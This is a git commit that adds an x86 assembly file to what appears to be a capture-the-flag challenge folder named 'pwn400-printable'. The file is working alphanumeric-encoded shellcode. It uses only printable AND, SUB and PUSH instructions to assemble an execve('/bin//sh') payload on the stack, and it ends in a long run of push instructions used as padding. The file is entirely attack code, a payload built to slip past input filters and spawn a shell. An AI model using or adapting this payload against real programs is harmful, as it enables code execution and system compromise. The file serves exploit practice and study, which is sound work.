69f517242f02bcba90cc8826056c689a089b85fb
WangYihang <wangyihanger@gmail.com>
2017-04-19 00:51:56 +0800

    add shellcode

---
+++ pwn/pwn400-printable/shellcode.asm
@@ -0,0 +1,195 @@
+global _start
+	_start:
+		;========================
+		;  add esp, ??? 
+		;========================
+		push esp
+		pop eax
+		sub eax, 55555442H
+		sub eax, 55555442H
+		sub eax, 55555442H
+		push eax
+		pop esp
+		;========================
+		;  set $eax=0x90909090
+		;========================
+		and eax, 49494949H
+		and eax, 30303030H
+		sub eax, 25252526H
+		sub eax, 25252525H
+		sub eax, 25252525H
+		push eax
+		;========================
+		;  set $eax=0x90909080
+		;========================
+		and eax, 49494949H
+		and eax, 30303030H
+		sub eax, 2525252bH
+		sub eax, 2525252bH
+		sub eax, 2525252aH
+		push eax
+		;========================
+		;  set $eax=0xcde3896e
+		;========================
+		and eax, 49494949H
+		and eax, 30303030H
+		sub eax, 655e2831H
+		sub eax, 655e2731H
+		sub eax, 67602730H
+		push eax
+		;========================
+		;  set $eax=0x69622f68
+		;========================
+		and eax, 49494949H
+		and eax, 30303030H
+		sub eax, 32354633H
+		sub eax, 32344533H
+		sub eax, 32344532H
+		push eax
+		;========================
+		;  set $eax=0x68732f2f
+		;========================
+		and eax, 49494949H
+		and eax, 30303030H
+		sub eax, 332f4646H
+		sub eax, 322f4546H
+		sub eax, 322e4545H
+		push eax
+		;========================
+		;  set $eax=0x68510bb0
+		;========================
+		and eax, 49494949H
+		and eax, 30303030H
+		sub eax, 333a516fH
+		sub eax, 323a5170H
+		sub eax, 323a5171H
+		push eax
+		;========================
+		;  set $eax=0xe1f7c931
+		;========================
+		and eax, 49494949H
+		and eax, 30303030H
+		sub eax, 5e576745H
+		sub eax, 5f576745H
+		sub eax, 60596845H
+		push eax
+		;========================
+		;  push 0x90
+		;========================
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
